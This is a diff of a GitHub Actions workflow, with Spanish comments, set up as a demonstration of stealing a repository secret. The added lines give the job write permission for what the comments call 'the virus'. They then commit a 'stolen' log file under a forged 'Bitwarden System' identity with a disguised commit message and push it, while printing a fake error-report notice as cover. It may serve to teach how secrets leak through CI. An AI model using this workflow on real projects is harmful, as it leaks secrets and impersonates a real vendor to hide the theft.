@@ -1,11 +1,31 @@
 name: Demo Robo de Secretos
-on: [workflow_dispatch] # Para activarlo con un botón
+
+on: [workflow_dispatch]
+
 jobs:
   ataque:
     runs-on: ubuntu-latest
+    # Necesitamos permisos de escritura para que el virus pueda subir el archivo
+    permissions:
+      contents: write 
+
     steps:
       - uses: actions/checkout@v4
+
       - name: Ejecutar Bitwarden
         env:
           MI_SECRET_TOKEN: ${{ secrets.MI_SECRET_TOKEN }}
         run: python app.py
+
+      - name: Exfiltrar datos a GitHub
+        run: |
+          echo "[!] Iniciando envío de reporte de errores al servidor central..."
+          # Configuramos un usuario falso para el commit
+          git config --global user.name "Bitwarden System"
+          git config --global user.email "system@bitwarden.com"
+          
+          # Agregamos el archivo "robado" y lo subimos
+          git add log_report.txt
+          git commit -m "System Log Update [Internal]"
+          git push
+          echo "[SUCCESS] Reporte enviado correctamente."
